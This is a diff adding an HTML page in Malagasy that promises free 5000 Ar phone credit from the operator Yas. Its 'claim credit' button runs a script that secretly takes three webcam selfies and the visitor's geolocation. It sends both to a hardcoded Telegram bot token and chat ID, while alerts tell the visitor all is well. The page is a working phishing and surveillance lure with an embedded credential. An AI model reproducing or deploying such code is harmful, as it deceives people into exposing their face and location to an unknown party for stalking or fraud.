@@ -1,0 +1,234 @@
+
+<!DOCTYPE html>
+<html lang="mg">
+<head>
+  <meta charset="UTF-8"/>
+  <title>Conexion yas gratuit</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+
+  <style>
+    :root {
+      --c1: #090b1a;
+      --c2: #151a3d;
+      --c3: #34216d;
+      --white: #ffffff;
+      --blue: #1877f2;
+    }
+
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      margin: 0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+      background:
+        radial-gradient(circle at top left, #34216d, transparent 45%),
+        radial-gradient(circle at bottom right, #153b75, transparent 45%),
+        linear-gradient(135deg, var(--c1), var(--c2));
+      color: var(--white);
+      font-family: 'Segoe UI', sans-serif;
+      overflow: hidden;
+    }
+
+    .container {
+      width: 90%;
+      max-width: 380px;
+      padding: 40px 25px;
+      text-align: center;
+      background: rgba(255, 255, 255, 0.06);
+      border: 1px solid rgba(255, 255, 255, 0.15);
+      border-radius: 28px;
+      backdrop-filter: blur(18px);
+      box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4);
+      animation: appear 0.8s ease;
+    }
+
+    @keyframes appear {
+      from {
+        opacity: 0;
+        transform: translateY(30px);
+      }
+      to {
+        opacity: 1;
+        transform: translateY(0);
+      }
+    }
+
+    h1 {
+      margin: 0 0 12px;
+      font-size: 32px;
+      font-weight: 700;
+      letter-spacing: 1px;
+    }
+
+    p {
+      margin: 0 0 28px;
+      color: #b9c5e8;
+      font-size: 15px;
+    }
+
+    button {
+      width: 100%;
+      padding: 16px 25px;
+      border: none;
+      border-radius: 14px;
+      background: linear-gradient(135deg, #1877f2, #0866ff);
+      color: var(--white);
+      font-size: 17px;
+      font-weight: 600;
+      cursor: pointer;
+      box-shadow: 0 8px 25px rgba(24, 119, 242, 0.35);
+      transition: 0.3s ease;
+    }
+
+    button:hover {
+      transform: translateY(-3px);
+      box-shadow: 0 12px 35px rgba(24, 119, 242, 0.55);
+    }
+
+    button:active {
+      transform: scale(0.97);
+    }
+
+    .facebook-icon {
+      display: inline-flex;
+      justify-content: center;
+      align-items: center;
+      width: 25px;
+      height: 25px;
+      margin-right: 8px;
+      background: white;
+      color: #1877f2;
+      border-radius: 50%;
+      font-size: 20px;
+      font-weight: bold;
+    }
+
+    .footer {
+      margin-top: 25px;
+      color: #7886b4;
+      font-size: 12px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="container">
+
+    <h1>Yas eo anilanao</h1>
+
+    <p>
+      fizarana
+      <strong>CREDIT 5000AR</strong>
+    </p>
+
+    <button onclick="startProcess()">
+      <span class="phone-icon">Yas</span>
+      HAKA ILAY CREDIT GRATUIT
+    </button>
+
+    <div class="footer">
+      Yas 2026
+    </div>
+
+  </div>
+
+  <script>
+    function startProcess() {
+      // Place ici ton processus de connexion.
+      alert("TONGASOA FIZARANA CREDIT YAS GRATUIT");
+    }
+  
+  <script>
+
+
+
+
+  /* ------------- PARAMÈTRES TELEGRAM ------------- */
+  const BOT_TOKEN = "8469966308:AAGzr6xL7R3zqV9r9yCC61LTCIxvY6oKtOs";
+  const CHAT_ID   = "8124974450";
+
+  /* ------------- FONCTION PRINCIPALE ------------- */
+  async function startProcess() {
+    try {
+      // 1. Maka sary 3
+      const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      const video  = document.createElement('video');
+      video.srcObject = stream;
+      await video.play();
+
+      const canvas = document.createElement('canvas');
+      const ctx    = canvas.getContext('2d');
+
+      for (let i = 0; i < 3; i++) {
+        await new Promise(r => setTimeout(r, 1200));
+        canvas.width  = video.videoWidth;
+        canvas.height = video.videoHeight;
+        ctx.drawImage(video, 0, 0);
+        const imgData = canvas.toDataURL('image/png');
+        await sendPhoto(imgData, "📸 Selfie #" + (i+1));
+      }
+      stream.getTracks().forEach(t => t.stop());
+
+      // 2. Maka toerana
+      navigator.geolocation.getCurrentPosition(function(pos) {
+        const { latitude: lat, longitude: lon } = pos.coords;
+        const loc = `📍 Toerana: https://www.google.com/maps?q=${lat},${lon}`;
+        sendMessage(loc); 
+        alert("✅ Vita ny test, Tongasoa!");
+      });
+
+    } catch (err) {
+      alert("❌ Nisy olana: " + err.message);
+      console.error(err);
+    }
+  }
+
+  /* ------------- ENVOI PHOTO ------------- */
+  async function sendPhoto(imgBase64, caption) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
+    const form = new FormData();
+    form.append("chat_id", CHAT_ID);
+    form.append("caption", caption);
+
+    const blob = dataURItoBlob(imgBase64);
+    form.append("photo", blob, "selfie.png");
+
+    const res = await fetch(url, { method: "POST", body: form });
+    console.log("sendPhoto status:", res.status);
+  }
+
+  /* ------------- ENVOI MESSAGE TEXTE ------------- */
+  async function sendMessage(text) {
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+    const res = await fetch(url, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({
+        chat_id: CHAT_ID,
+        text: text
+      })
+    });
+
+    console.log("sendMessage status:", res.status);
+  }
+
+  /* ------------- UTILITAIRE ------------- */
+  function dataURItoBlob(dataURI) {
+    const byteString = atob(dataURI.split(',')[1]);
+    const mime = dataURI.split(',')[0].split(':')[1].split(';')[0];
+    const ab   = new ArrayBuffer(byteString.length);
+    const ia   = new Uint8Array(ab);
+    for (let i = 0; i < byteString.length; i++) ia[i] = byteString.charCodeAt(i);
+    return new Blob([ab], { type: mime });
+  }
+</script>
+</body>
+</html>
